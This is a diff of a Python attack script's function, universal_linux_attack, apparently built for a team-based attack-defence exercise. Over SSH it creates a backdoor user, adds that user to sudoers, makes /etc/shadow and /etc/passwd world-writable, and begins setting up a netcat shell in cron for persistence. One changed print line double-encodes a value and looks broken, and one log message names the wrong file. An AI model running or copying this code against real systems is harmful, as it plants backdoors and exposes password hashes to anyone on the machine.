@@ -80,11 +80,11 @@ def universal_linux_attack(host):
     
     ssh.sendline(user_add_cmd)
     ssh.prompt()
-    print(ssh.before)
+    print(ssh.before.encode('utf8'))
 
     ssh.sendline(user_passwd_cmd)
     ssh.prompt()
-    print(ssh.before)
+    print(ssh.before.encode('utf8'))
     
     # add user to sudoers
     print("Adding user {0} to sudoers on {1}.".format(username, host.ip))
@@ -125,7 +125,7 @@ def universal_linux_attack(host):
     print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
     ssh.sendline(shadow_perms_cmd)
     ssh.prompt()
-    print(ssh.before)
+    print(ssh.before.encode('utf8').encode('utf8'))
     
     # ez mode /etc/passwd
     passwd_perms_cmd = "chmod 777 /etc/passwd"
@@ -133,7 +133,7 @@ def universal_linux_attack(host):
     print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
     ssh.sendline(passwd_perms_cmd)
     ssh.prompt()
-    print(ssh.before)
+    print(ssh.before.encode('utf8'))
 
     # add netcat shell to cron
     netcat_port = "1{}{}".format(host.team, host.last_octet)
